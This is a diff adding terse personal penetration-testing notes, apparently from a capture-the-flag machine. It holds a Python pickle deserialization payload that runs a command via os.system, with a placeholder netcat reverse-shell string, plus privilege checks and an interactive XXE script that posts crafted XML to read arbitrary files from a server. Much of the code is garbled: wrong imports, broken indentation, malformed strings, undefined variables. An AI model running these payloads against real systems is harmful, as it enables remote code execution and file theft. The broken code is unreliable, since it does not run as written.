@@ -1,0 +1,54 @@
+payload all the things
+XXEinjects 
+
+import pickle
+from base64 import urlsafe_64encode as b64encode
+
+RUNME='''pentestmonkey--nc-rv'''
+
+class xxx(object):
+    def __reduce__(self):
+    import os
+    return(os.system, (RUNME,))
+
+print b64encode(pickle.dumps(xxx()))
+
+change content-type to text
+
+check for user if sudo 
+groups 
+roosa adm sudo
+
+find . | grep git
+
+
+vi exploit-xxe.py
+import requests
+import re
+
+def  PerformXXE(filename):
+    xml = f '''
+    <?xml version="1.0"?>
+    <!DOCTYPE DATA[
+    <!ELEMENT data (ANY)>
+    <!ENTITY pleaseSubscript SYSTEM {filename}>
+    !>
+    <xxe>
+    <Author>Ippsec1</Author>
+    <Subject> $filename;</Subject>
+    <Content>adfdfdaf</Content>
+    </xxe>
+    '''
+    files = {'file':('xxx.xml',xml)}
+    respose =requests.post(url,\
+        files=files 
+    ).text
+    
+    result = re.findall(r'Ippsec1(.*?)adfdfdaf',response, re.DOTALL)
+    return  result
+while True:
+    name = input(">")
+    print(PerformXXE(name))
+
+
+
